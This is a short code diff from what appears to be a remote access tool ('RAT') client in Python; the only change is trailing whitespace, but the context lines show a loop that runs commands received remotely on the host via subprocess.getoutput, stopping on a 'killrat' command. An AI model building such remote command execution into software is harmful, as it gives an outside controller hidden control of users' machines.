@@ -79,7 +79,7 @@ class CLIENT:
         """
         while True:
             if self.command == "killrat": #Kill command
-                break
+                break  
             if self.command != "": #If the client already has a command
                 try:
                     result = subprocess.getoutput(self.command) #Run command on machine
